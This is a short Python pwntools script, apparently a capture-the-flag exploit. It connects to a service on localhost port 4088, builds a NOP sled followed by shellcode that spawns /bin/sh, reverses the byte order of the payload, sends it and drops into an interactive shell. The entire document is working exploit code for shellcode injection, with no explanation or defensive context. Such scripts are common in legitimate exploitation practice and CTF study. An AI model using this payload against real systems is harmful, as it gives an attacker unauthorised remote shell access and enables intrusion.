
from pwn import *

io = remote('localhost',4088)
io.recvuntil("stuff!!")
shellcode = asm(shellcraft.sh())
payload = (0x400-len(shellcode)) * b'\x90'
payload += shellcode
payload = payload[::-1] 
io.sendline(payload)
io.interactive()